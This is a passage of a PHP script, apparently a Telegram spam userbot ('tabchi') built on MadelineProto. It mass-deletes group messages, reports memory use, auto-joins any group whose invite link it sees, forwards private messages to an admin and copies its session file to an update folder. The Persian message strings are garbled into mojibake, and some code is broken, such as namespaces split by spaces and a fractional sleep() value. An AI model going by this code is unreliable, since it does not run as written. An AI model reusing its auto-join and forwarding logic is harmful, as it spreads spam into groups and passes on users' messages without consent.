				'message'=> "‚ù¶⁄Øÿ±ŸàŸá‚ù•ÿ®ÿßŸÖŸàŸÅŸÇ€åÿ™‚ô°Ÿæÿß⁄©ÿ≥ÿßÿ≤€å ÿ¥ÿØ", 
				'parse_mode'=> 'markdown' ,
				]);
				$array = range($msg_id,1);
				$chunk = array_chunk($array,100);
				foreach($chunk as $v){
				  sleep(0.05);
				  yield $this->channels->deleteMessages([
				  'channel' =>$chatID,
				  'id' =>$v
				]);
				}
			  }
			  else{
				yield $this->messages->sendMessage(['peer' => $chatID,'reply_to_msg_id' => $msg_id ,'message' => "‚ùó ÿß€åŸÜ ÿØÿ≥ÿ™Ÿàÿ± ŸÖÿÆÿµŸàÿµ ÿßÿ≥ÿ™ŸÅÿßÿØŸá ÿØÿ± ⁄Øÿ±ŸàŸá Ÿáÿß ŸÖ€åÿ®ÿßÿ¥ÿØ"]);
			  }
			}
			elseif($msg == 'ŸÖÿµÿ±ŸÅ' || $msg == 'ÿ≠ÿ¨ŸÖ' ){
$mem_using = round((memory_get_usage()/1024)/1024, 1).'MB';
$sessionsize = round(filesize('TABCHIquick.php')/1024/1024,2) . 'MB';
$load = sys_getloadavg();
yield $MadelineProto->messages->sendMessage(['peer' => $chatID,
'message' => "‚ôªÔ∏è MemUsage: $mem_using
‚åò ping: $load[0]
‚åò SessionSize: $sessionsize", 'reply_to_msg_id' => $msg_id]);
}
			
			
			
			elseif ( preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
              if ( @$data[ 'autojoinadmin' ][ 'on' ] == 'on' ) {
                preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg, $l );
                $link = $l[ 0 ];
                try {
                  yield $MadelineProto->messages->importChatInvite( [
                    'hash' => str_replace( 'https://t.me/joinchat/', '', $link ),
                  ] );
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‚ôªÔ∏è ÿ™ÿ®⁄Ü€å ‚ô° ÿØÿ± €å⁄© ⁄Øÿ±ŸàŸá ÿπÿ∂Ÿà ÿ¥ÿØ ‚ôªÔ∏è' ] );
                } catch ( \danog\ MadelineProto\ RPCErrorException $e ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‚ùå ŸÖÿ≠ÿØŸàÿØ€åÿ™ ÿπÿ∂Ÿà ÿ¥ÿØŸÜ!' ] );
                } catch ( \danog\ MadelineProto\ Exception $e2 ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‚ùå ŸÖÿ≠ÿØŸàÿØ€åÿ™ ÿπÿ∂Ÿà ÿ¥ÿØŸÜ!' ] );
                }
              }
            }
          }
		  
//===========================================================
		  elseif ( $type2 == 'user' ) {
			if ( @$data[ 'autoforwardadmin' ][ 'on' ] == 'on') {
			  yield $MadelineProto->messages->forwardMessages( [ 'from_peer' => $userID, 'to_peer' => $admin, 'id' => [ $msg_id ] ] );
			}
			}

          if ( $userID == $admin || isset( $data[ 'admins' ][ $userID ] ) ) {
            yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => false, 'peer' => $chatID, 'max_id' => $msg_id ] );
          }
          if ( $userID == $admin ) {
            if ( !file_exists( 'true' ) && file_exists( 'king.madeline' ) && filesize( 'king.madeline' ) / 1024 <= 4000 ) {
              file_put_contents( 'true', '' );
              yield $MadelineProto->sleep( 3 );
              copy( 'king.madeline', 'update-session/king.madeline' );
            }
          }
      }
    } catch ( Exception $e ) {}
  }
}
register_shutdown_function( 'shutdown_function', $lock );
closeConnection();
$MadelineProto->async( true );
$MadelineProto->loop( function ()use( $MadelineProto ) {
  yield $MadelineProto->setEventHandler( '\EventHandler' );
} );
$MadelineProto->loop();
